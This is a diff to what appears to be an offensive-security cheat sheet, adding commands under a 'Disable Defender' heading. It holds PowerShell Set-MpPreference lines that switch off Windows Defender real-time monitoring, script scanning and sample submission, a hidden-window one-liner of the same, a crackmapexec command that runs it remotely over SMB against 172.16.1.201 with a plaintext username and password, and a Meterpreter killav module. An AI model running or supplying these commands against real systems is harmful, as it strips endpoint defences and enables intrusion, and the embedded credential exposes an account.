@@ -45,10 +45,17 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 
 #### Disable Defender
 ```
+#PowerShell
 Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableRealtimeMonitoring $true 
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+#CMD one-liner
 Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;
+
+#from CME  
 sudo crackmapexec smb 172.16.1.201 -u joe -p 'Dev0ftheyear!' -x 'Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;'
+
+#Meterpreter
 run post/windows/manage/killav
 ```
 
